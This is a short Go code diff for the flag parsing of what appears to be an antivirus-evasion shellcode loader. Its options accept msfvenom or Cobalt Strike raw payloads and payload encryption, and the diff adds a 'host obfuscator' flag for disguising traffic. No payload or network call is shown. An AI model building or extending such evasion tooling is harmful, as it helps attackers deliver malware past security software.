@@ -23,8 +23,9 @@ func initialize() {
 	flag.StringVar(&mAv.loader, "l", "binary", "loader: binary")
 	flag.StringVar(&mAv.shellcode, "sc", "payload.e", "encrypt payload by anti-av: support 'msfvenom -f raw' OR 'cs raw' OR remote url loading")
 	flag.StringVar(&mAv.os, "os", "windows", "OS: windows,linux")
-	flag.StringVar(&mAv.sign, "sign", "baidu.com", "sign infomation")
-	flag.BoolVar(&mAv.crypt, "e", false, "encrypt payload")
+	flag.StringVar(&mAv.domain, "domain", "baidu.com", "domain to be signed")
+	flag.StringVar(&mAv.hostObfuscator, "ho", "wwww.baidu.com", "host obfuscator")
+	flag.BoolVar(&mAv.crypt, "e", false, "payload to be encrypted")
 	flag.Parse()
 
 	if err := mAv.validate(); err != nil {
@@ -45,7 +46,7 @@ func (c *config) validate() error {
 	default:
 		return fmt.Errorf("not Support OS: %v", c.os)
 	}
-	if c.sign == "" {
+	if c.domain == "" {
 		logrus.Warn("[-] no Sign Infomation")
 	}
 
